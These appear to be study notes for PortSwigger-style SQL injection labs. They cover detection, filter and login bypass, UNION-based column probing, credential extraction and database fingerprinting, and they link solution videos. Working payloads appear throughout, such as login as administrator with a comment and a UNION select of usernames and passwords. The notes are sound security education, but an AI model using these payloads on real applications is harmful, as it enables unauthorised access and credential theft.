# SQL Injection (Practitioner is at the bottom after the final lab)
SQL Injection (SQLi) is a type of cyberattack where an attacker inserts malicious SQL code into an application's input fields to manipulate the database behind the application. 

## How to detect SQLi vulnerabilities 
You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote character ' and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner.
  
### Example:
Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:

https://insecure-website.com/products?category=Gifts
This causes the application to make a SQL query to retrieve details of the relevant products from the database:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
This SQL query asks the database to return:

all details (*)
from the products table
where the category is Gifts
and released is 1.
The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.

The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

https://insecure-website.com/products?category=Gifts'--
This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

https://insecure-website.com/products?category=Gifts'+OR+1=1--
This results in the SQL query:

SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.

# Warning
Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.

## Subverting application logic
Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:

SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
This query returns the user whose username is administrator and successfully logs the attacker in as that user.

## Lab 1
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

SELECT * FROM products WHERE category = 'Gifts' AND released = 1
To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

https://youtu.be/alTceRdSxS0?si=fMfSEY-HDrT4o92O

## Lab 2
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the administrator user.

https://youtu.be/ML3aGaloczI?si=piwR66H5-fh8EI6f

# Practitioner (additional info)
## SQL Injection Union attacks
Union is used to retrieve data from other tables during SQLi

The UNION keyword enables you to execute one or more additional SELECT queries and append the results to the original query. For example:

SELECT a, b FROM table1 UNION SELECT c, d FROM table2
This SQL query returns a single result set with two columns, containing values from columns a and b in table1 and columns c and d in table2.

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries

### When you perform an SQL Injection there are two effective methods to determine how many columns are being returned from the original query:
- One method involves injecting a series of ORDER BY clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the WHERE clause of the original query, you would submit:

' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.

- Another method is submitting a series of UNION SELECT payloads specifying a different number of null values:

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
If the number of nulls does not match the number of columns, the database returns an error

### LAB 
https://youtu.be/umXGHbEyW5I?si=YjvGtlbnkA_mdM0c

## Database specific syntax
On Oracle, every SELECT query must use the FROM keyword and specify a valid table. There is a built-in table on Oracle called dual which can be used for this purpose. So the injected queries on Oracle would need to look like:

' UNION SELECT NULL FROM DUAL--

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of UNION SELECT payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
If the column data type is not compatible with string data, the injected query will cause a database error

## LAB
https://youtu.be/SGBTC5D7DTs?si=K0SbVk7C3yhJ5kCo

# Using a SQL injection UNION attack to retrieve interesting data
- When you have found the columns and you know which columns hold string data, you are in a good position to retrieve interesting data.
- Suppose that:

The original query returns two columns, both of which can hold string data.
The injection point is a quoted string within the WHERE clause.
The database contains a table called users with the columns username and password.
In this example, you can retrieve the contents of the users table by submitting the input:

' UNION SELECT username, password FROM users--
In order to perform this attack, you need to know that there is a table called users with two columns called username and password

## LAB 
https://youtu.be/PLa_oQtMl1U?si=iUBsLEkWiJAxFgJU

# Retrieving multiple values within a single column
- In some cases the table might only return a single column. You can join multiple values together within this column by submitting this input in burpsuite: '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
- Please note that this may differ based on the number of tables in the website (NULL)

## LAB
https://youtu.be/yRVYoqR9vrI?si=pOZ9fR_9kLNnqnqF

# Examining the database in SQL injection attacks
- When performing SQL injection it is very important to examine the database and find information about it. This includes the type and software of the database, and the number of columns and tables in the database
- You can identify the type of database by submitting the following queries:
- Database type	Query
Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()
For example, you could use a UNION attack with the following input:

' UNION SELECT @@version--

## LAB 
https://youtu.be/MFTk_LNRW0g?si=O3ixXs8q6otcu1vL
